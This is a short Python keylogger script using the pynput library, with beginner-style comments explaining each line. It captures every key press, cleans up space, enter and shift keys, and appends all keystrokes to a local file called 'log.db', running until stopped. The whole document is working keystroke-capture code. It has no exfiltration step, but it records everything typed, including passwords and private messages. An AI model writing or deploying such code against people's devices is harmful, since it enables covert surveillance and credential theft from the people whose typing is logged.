from pynput.keyboard import Listener, Key
#This is a library in Python that allows you to control and monitor input devices.
# This class from pynput.keyboard is used to listen for keyboard events.

#The argument key represents the key that was pressed
def log_presskey(key):
    #converts key to a string and removes single quotes from the string
    key = str(key).replace("'", "")

    #checks if the pressed key is the space bar and if it is it replaces it with a space character ' '
    if key == 'Key.space':
        key = ' '
    #if its the enter key it replaces it with a newline character
    elif key == 'Key.enter':
        key = '\n'
    #since shift key characters arent logged it replaces it with an empty string ' '
    elif key == 'Key.shift':
        key = ''

    #try command attempts to open a file named log.db in append mode "a"
    try:
        with open("log.db", "a") as f: #Opens the file and creates a file object
            f.write(key) #writes cleaned key to file
    except Exception as e:
        print(f"Error writing to file: {e}") #if exceptions found during fle operations, prints error msg

#Listener(on_press=log_presskey) creates a listener object that calls the log_presskey function whenever a key is pressed
#as Listener assigns the Listener object to the var listener
with Listener(on_press=log_presskey) as listener:
    listener.join()  # join function keeps the program running so it can continue listening to key presses
